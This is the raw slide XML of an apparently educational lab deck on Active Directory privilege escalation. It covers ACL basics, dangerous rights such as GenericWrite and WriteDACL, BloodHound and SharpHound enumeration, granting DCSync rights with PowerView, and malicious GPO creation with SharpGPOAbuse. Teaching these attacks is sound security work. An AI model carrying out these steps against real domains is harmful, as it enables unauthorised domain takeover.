        </p:spPr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                                               </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Task 02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457577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3089" y="58057"/>
            <a:ext cx="8596668" cy="1320800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 02: Exploiting Weak ACLs &amp; GPO Abuse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378857"/>
            <a:ext cx="12061371" cy="5617029"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Abuse permissions granted to users to escalate to Domain Admin or modify Group Policies. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>ACL Abuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: Use BloodHound to find users with GenericWrite or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>AllExtendedRights</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> over high-value objects (like a Domain Admin user or a Group). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Use Add-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>DomainObjectAcl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) to grant yourself "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>" rights. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>GPO Abuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>SharpGPOAbuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> to create a malicious GPO that adds your user to the local Administrators group on all workstations. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: Learn that misconfigured permissions are often more dangerous than software bugs in Active Directory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10486209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22123"/>
            <a:ext cx="5530645" cy="6858001"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>What is an ACL?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>ACL (Access Control List) is basically a permission map — it defines who can access what, and what they’re allowed to do with it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>An ACL is a list attached to a resource (file, folder, network, etc.) that specifies:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>👉 Subjects (users / groups)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>👉 Permissions (read, write, execute, etc.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Core Idea</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Think of ACL like this:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>“Who gets in, and what can they do once inside?”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>📂 Example (File System ACL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>For a file:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>report.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>ACL might look like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>User A → Read, Write</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>User B → Read only</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>User C → No access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="19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99CFBDE-030E-2C49-2EB8-E8DB6A01DDAE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703939" y="196366"/>
            <a:ext cx="6098458" cy="4862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1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>So:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>✔ A can edit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>✔ B can only view</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>❌ C is blocked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900" dirty="0"/>
              <a:t> Task is where you in Task 2 move from “collecting creds” to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>actually taking control of the domain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900" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>        What this task is about </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr mar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900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>       You’re abusing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>misconfigured permissions (ACLs)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> in Active Directory to escalate privileges—often all the way to Domain Admin—without exploiting software bugs.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="425119944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Autofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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1700" dirty="0"/>
              <a:t>ACL = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Access Control List</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>In Active Directory:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Every object (user, group, computer) has a list of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>who can do what to it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔐 Example (simple mindset)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>User: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>john</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>Object: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Domain Admins                                                                       </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>ACL might say:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Alice → Read </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Bob → Write </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>You → GenericWrite 😈 👉 This is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>powerful permission                               </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It means:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>“You can modify attributes of this object”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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1700" dirty="0"/>
              <a:t>👉 That last one (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>i.e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>GenericWrite )</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>is where things get dangerous.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>“Do I have permission to modify something important?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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1700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1700" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 7"/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4242704" y="3244334"/>
            <a:ext cx="1847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992882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553D35-0875-3975-95B2-EFA3340494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9271" y="144309"/>
            <a:ext cx="11240730" cy="6153252"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PART 1 — ACL Abuse (with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>)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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🎯 Goal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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Find: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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Users/groups where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>your current user has dangerous rights</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>, like: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1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700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>GenericWrite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>                                                                      </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" eaLnBrk="0" fontAlgn="base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700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>AllExtendedRights</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" eaLnBrk="0" fontAlgn="base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700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>WriteDACL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" eaLnBrk="0" fontAlgn="base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700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>WriteOwner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>These can let you </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>modify high-value objects</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (e.g., a Domain Admin account or group,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> Domain Controllers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc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967985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Content Placeholder 12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82344462"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="838200" y="1825625"/>
          <a:ext cx="3101668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1668">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="157165324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If you control one of these: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77022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💀 You control the domain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3808772"/>
                  </a:ext>
                </a:extLst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0076631"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6526271" y="1612510"/>
          <a:ext cx="3881335" cy="212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81335">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="386796567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If you have </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0"/>
                        <a:t>GenericWrite over a user</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>: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19020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Change properties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662301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Add them to groups (indirectly)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669103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Modify login-related attributes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8083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Abuse delegation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5141681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2FE92EC6-FC69-D877-FEEA-24EDCAABA950}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659990" y="1427844"/>
            <a:ext cx="33958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n-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Why these matter: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7D0282F-9FBD-0753-E706-BB8138D49A28}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6526271" y="1243178"/>
            <a:ext cx="60984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n-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>What can you do with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042779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6813755" cy="7039429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1700" b="1" dirty="0"/>
              <a:t>Step 1 — Collect data (on compromised Windows)      </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>Run SharpHound (ingestor for BloodHound): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Ingestor = data collector + feeder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700" dirty="0"/>
              <a:t>SharpHound collects data from Active Directory and feeds it into BloodHound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700" dirty="0"/>
              <a:t>SharpHound.exe -c All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700" dirty="0"/>
              <a:t>👉 This gathers:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Users                    ACL relationships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700" dirty="0"/>
              <a:t>Groups                   Sessions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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Step 2 — Load into BloodHound (on Kali)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1700" dirty="0"/>
              <a:t>What does BloodHound actually do?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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It maps relationships like:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
            </a:endParaRP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700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>You → (GenericWrite) → AdminUser → Domain Admins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1700" dirty="0"/>
              <a:t>But it does NOT collect data itself</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS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sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/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1A0EC73-0391-3D1C-44F1-878415A7F117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4252912" y="1885950"/>
            <a:ext cx="7305675" cy="198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90462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97550B9-93D6-6E47-DB2D-4FCAFD766B50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45178" y="0"/>
            <a:ext cx="11468100" cy="6426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200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>💡 So instead of guessing:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>You get a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>graph of attack paths</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" b="1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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Open </a:t>
            </a:r>
